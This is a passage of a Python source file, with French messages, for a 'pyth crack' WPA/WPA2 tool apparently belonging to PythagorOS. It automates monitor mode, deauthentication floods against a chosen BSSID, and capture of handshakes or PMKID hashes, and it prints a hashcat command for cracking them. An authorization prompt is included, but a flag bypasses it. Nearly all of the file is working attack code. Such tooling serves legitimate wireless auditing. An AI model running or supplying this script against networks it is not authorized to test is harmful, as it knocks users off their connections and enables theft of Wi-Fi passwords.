# ---------------------------------------------------------------- style ----
_C = sys.stdout.isatty()
def _c(code, s): return f"\033[{code}m{s}\033[0m" if _C else s
def log(s):  print(_c("0;90", "[*]"), s)
def ok(s):   print(_c("1;32", "[+]"), s)
def warn(s): print(_c("1;33", "[!]"), s)
def err(s):  print(_c("1;31", "[-]"), s, file=sys.stderr)
def hdr(s):  print(_c("1;36", f"\n== {s} =="))
def die(s, code=1):
    err(s)
    sys.exit(code)

# --------------------------------------------------------- état / cleanup --
_BG_PROCS = []          # processus de fond (airodump/hcxdumptool) à tuer
_STATE = {"mon": None, "base_iface": None, "killed_nm": False}


def _run(cmd, timeout=None, check=False, quiet=True):
    """Lance une commande courte et renvoie le CompletedProcess."""
    try:
        return subprocess.run(
            cmd,
            stdout=(subprocess.DEVNULL if quiet else None),
            stderr=(subprocess.DEVNULL if quiet else None),
            timeout=timeout,
            check=check,
        )
    except subprocess.TimeoutExpired:
        warn(f"délai dépassé : {' '.join(cmd)}")
    except subprocess.CalledProcessError as e:
        if check:
            raise
        return e
    except FileNotFoundError:
        die(f"binaire introuvable : {cmd[0]}")


def _run_out(cmd, timeout=30):
    """Lance une commande et renvoie (rc, stdout) en texte."""
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return 1, ""


def cleanup(*_):
    """Arrête la capture, quitte le mode moniteur et rend le réseau."""
    hdr("Nettoyage")
    for p in _BG_PROCS:
        try:
            if p.poll() is None:
                p.terminate()
                try:
                    p.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    p.kill()
        except Exception:
            pass
    mon = _STATE.get("mon")
    if mon:
        log(f"sortie du mode moniteur ({mon})")
        _run(["airmon-ng", "stop", mon])
    if _STATE.get("killed_nm"):
        log("redémarrage de NetworkManager")
        _run(["systemctl", "start", "NetworkManager"])
    ok("terminé.")


# ------------------------------------------------------------- pré-requis --
def require_root():
    if os.geteuid() != 0:
        die("doit être lancé en root (sudo pyth-crack …)")


def need(bins):
    missing = [b for b in bins if shutil.which(b) is None]
    if missing:
        die("outils manquants : " + ", ".join(missing) +
            "\n    → installe-les :  sudo apt install aircrack-ng iw hcxdumptool hcxtools"
            "\n    (ou :  pythagor-tools install passwords network wireless)")


# --------------------------------------------------------- interfaces Wi-Fi -
def iw_dev():
    """Renvoie [(iface, type)] d'après `iw dev`."""
    rc, out = _run_out(["iw", "dev"])
    res, cur = [], None
    for line in out.splitlines():
        line = line.strip()
        m = re.match(r"Interface\s+(\S+)", line)
        if m:
            cur = m.group(1)
        elif line.startswith("type ") and cur:
            res.append((cur, line.split(None, 1)[1].strip()))
            cur = None
    return res


def detect_wifi():
    """Liste les interfaces Wi-Fi (managed ou monitor)."""
    return [name for name, _ in iw_dev()]


def iface_exists(name):
    return os.path.isdir(f"/sys/class/net/{name}")


# ------------------------------------------------------------- mode moniteur -
def enter_monitor(iface, channel):
    hdr("Passage en mode moniteur")
    log("kill des processus parasites (NetworkManager, wpa_supplicant…)")
    _run(["airmon-ng", "check", "kill"])
    _STATE["killed_nm"] = True

    log(f"activation du mode moniteur sur {iface}")
    args = ["airmon-ng", "start", iface]
    if channel:
        args.append(str(channel))
    _run(args)

    # Retrouver l'interface moniteur (nom variable : wlan0mon, mon0, iface…)
    for name, typ in iw_dev():
        if typ == "monitor":
            _STATE["mon"] = name
            ok(f"mode moniteur actif : {name}")
            return name
    for cand in (iface + "mon", "mon0", iface):
        if iface_exists(cand):
            _STATE["mon"] = cand
            ok(f"mode moniteur (présumé) : {cand}")
            return cand
    die("impossible de passer en mode moniteur (voir `airmon-ng`).")


# --------------------------------------------------------- détection canal --
def find_channel(mon, bssid, scan=12):
    """Balaye brièvement pour retrouver le canal de la BSSID cible."""
    hdr("Recherche du canal de la cible")
    prefix = os.path.join(tempfile.gettempdir(), "pyth-crack-scan")
    for f in _globs(prefix):
        _rm(f)
    p = subprocess.Popen(
        ["airodump-ng", "-w", prefix, "--output-format", "csv", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    _BG_PROCS.append(p)
    time.sleep(scan)
    p.terminate()
    try:
        p.wait(timeout=5)
    except subprocess.TimeoutExpired:
        p.kill()
    csvs = _globs(prefix + "*.csv")
    for csv in csvs:
        try:
            with open(csv, encoding="utf-8", errors="ignore") as fh:
                for line in fh:
                    cols = [c.strip() for c in line.split(",")]
                    if cols and cols[0].upper() == bssid.upper() and len(cols) > 3:
                        ch = cols[3]
                        if ch.isdigit():
                            ok(f"canal détecté : {ch}")
                            for f in csvs:
                                _rm(f)
                            return int(ch)
        except OSError:
            continue
    for f in csvs:
        _rm(f)
    warn("canal introuvable au scan — précise-le avec -c.")
    return None


# ----------------------------------------------------------- désauth/capture -
def has_handshake(cap):
    if not (os.path.exists(cap) and os.path.getsize(cap) > 0):
        return False
    rc, out = _run_out(["aircrack-ng", cap], timeout=30)
    return bool(re.search(r"\(\s*[1-9]\d*\s+handshake", out))


def deauth_burst(mon, bssid, client, count):
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(mon)
    _run(cmd, timeout=30)


def capture_handshake(mon, bssid, channel, client, timeout, count, outdir):
    hdr("Capture du handshake WPA")
    prefix = os.path.join(outdir, f"handshake_{bssid.replace(':', '')}")
    for f in _globs(prefix + "*"):
        _rm(f)
    dump = subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "-c", str(channel),
         "-w", prefix, "--output-format", "pcap,csv", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    _BG_PROCS.append(dump)
    cap = prefix + "-01.cap"
    deadline = time.time() + timeout
    time.sleep(3)  # laisse airodump se caler sur le canal
    try:
        while time.time() < deadline:
            if dump.poll() is not None:
                err("airodump-ng s'est arrêté prématurément.")
                return None
            remaining = int(deadline - time.time())
            log(f"désauth de la cible ({count} trames)… {remaining}s restantes")
            deauth_burst(mon, bssid, client, count)
            time.sleep(6)
            if has_handshake(cap):
                ok(f"HANDSHAKE capturé → {cap}")
                return cap
        warn("timeout atteint sans handshake.")
        return None
    finally:
        if dump.poll() is None:
            dump.terminate()


def capture_pmkid(mon, bssid, timeout, outdir):
    hdr("Capture du PMKID (clientless)")
    if shutil.which("hcxdumptool") is None:
        warn("hcxdumptool absent — capture PMKID ignorée "
             "(sudo apt install hcxdumptool hcxtools).")
        return None
    pcap = os.path.join(outdir, f"pmkid_{bssid.replace(':', '')}.pcapng")
    _rm(pcap)
    # NB : la syntaxe de hcxdumptool varie selon la version ; on capture large
    # puis on filtre la cible à la conversion. Adapte si ta version diffère.
    proc = subprocess.Popen(
        ["hcxdumptool", "-i", mon, "-o", pcap, "--enable_status=1"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    _BG_PROCS.append(proc)
    log(f"écoute PMKID pendant {timeout}s…")
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    if not (os.path.exists(pcap) and os.path.getsize(pcap) > 0):
        warn("aucune donnée PMKID capturée.")
        return None
    if shutil.which("hcxpcapngtool"):
        hashfile = os.path.join(outdir, f"pmkid_{bssid.replace(':', '')}.22000")
        _run(["hcxpcapngtool", "-o", hashfile, pcap])
        if os.path.exists(hashfile) and os.path.getsize(hashfile) > 0:
            ok(f"PMKID/hash exploitable → {hashfile}")
            ok("crack : hashcat -m 22000 " + hashfile + " <wordlist>")
            return hashfile
        warn("conversion hcxpcapngtool sans PMKID valable pour la cible.")
    return pcap if os.path.exists(pcap) else None


# ------------------------------------------------------------------ utils --
def _globs(pattern):
    import glob
    return glob.glob(pattern)

def _rm(path):
    try:
        os.remove(path)
    except OSError:
        pass


# ------------------------------------------------------------- autorisation -
def authorization_gate(assume_yes):
    banner = (
        "Cet outil émet des trames de désauthentification et capture du\n"
        "  trafic. Confirme que tu es AUTORISÉ à auditer ce réseau."
    )
    warn(banner)
    if assume_yes:
        return
    try:
        ans = input(_c("1;36", "  Tape 'OUI' pour confirmer : ")).strip()
    except (EOFError, KeyboardInterrupt):
        die("annulé.")
    if ans != "OUI":
        die("autorisation non confirmée — abandon.")


# ------------------------------------------------------------------- main --
def parse_args():
    p = argparse.ArgumentParser(
        prog="pyth crack",
        description="Audit WPA/WPA2 PythagorOS : moniteur + désauth + capture "
                    "handshake/PMKID.",
        epilog="Exemple : pyth crack -b AA:BB:CC:DD:EE:FF -c 6 --method both",
    )
    p.add_argument("-b", "--bssid", required=True,
                   help="BSSID de la cible (AA:BB:CC:DD:EE:FF)")
    p.add_argument("-i", "--interface",
                   help="carte Wi-Fi (auto-détectée si omise)")
    p.add_argument("-c", "--channel", type=int,
                   help="canal (auto-détecté si omis)")
    p.add_argument("--client",
                   help="MAC d'un client précis à désauth (sinon broadcast)")
    p.add_argument("-m", "--method", choices=["handshake", "pmkid", "both"],
                   default="handshake", help="type de capture (défaut: handshake)")
    p.add_argument("-t", "--timeout", type=int, default=120,
                   help="timeout par capture, en secondes (défaut: 120)")
    p.add_argument("-d", "--deauth", type=int, default=5,
                   help="trames de désauth par salve (défaut: 5)")
    p.add_argument("-o", "--outdir", default="/root/pyth-crack",
                   help="dossier de sortie (défaut: /root/pyth-crack)")
    p.add_argument("-y", "--yes", action="store_true",
                   help="passe la confirmation d'autorisation")
    return p.parse_args()


def main():
    args = parse_args()          # gère -h sans exiger root
    require_root()

    if not re.fullmatch(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", args.bssid):
        die("BSSID invalide (format AA:BB:CC:DD:EE:FF).")

    hdr("pyth crack — audit WPA/WPA2 PythagorOS")
    authorization_gate(args.yes)

    need(["iw", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"])
    os.makedirs(args.outdir, exist_ok=True)

    # nettoyage garanti (Ctrl-C compris)
    signal.signal(signal.SIGINT, cleanup_and_exit)
    signal.signal(signal.SIGTERM, cleanup_and_exit)

    try:
        # 1) carte Wi-Fi
        hdr("Détection de la carte Wi-Fi")
        iface = args.interface
        if not iface:
            cards = detect_wifi()
            if not cards:
                die("aucune interface Wi-Fi détectée.")
            iface = cards[0]
            ok(f"carte sélectionnée : {iface}"
               + (f"  (autres : {', '.join(cards[1:])})" if len(cards) > 1 else ""))
        elif not iface_exists(iface):
            die(f"interface inexistante : {iface}")

        # 2) mode moniteur
        mon = enter_monitor(iface, args.channel)

        # canal (auto si besoin, requis pour le handshake)
        channel = args.channel
        if channel is None and args.method in ("handshake", "both"):
            channel = find_channel(mon, args.bssid)
            if channel is None:
                die("canal requis pour la capture handshake (option -c).")

        results = []
        # 3) captures
        if args.method in ("handshake", "both"):
            cap = capture_handshake(mon, args.bssid, channel, args.client,
                                    args.timeout, args.deauth, args.outdir)
            if cap:
                results.append(("handshake", cap))
        if args.method in ("pmkid", "both"):
            pm = capture_pmkid(mon, args.bssid, args.timeout, args.outdir)
            if pm:
                results.append(("pmkid", pm))

        hdr("Résultat")
        if results:
            for kind, path in results:
                ok(f"{kind:9s} : {path}")
            sys.exit(0)
        else:
            warn("aucune capture obtenue (cible hors de portée, aucun client, "
                 "ou timeout trop court).")
            sys.exit(2)
    finally:
        cleanup()


def cleanup_and_exit(*_):
    cleanup()
    sys.exit(130)


if __name__ == "__main__":
    main()
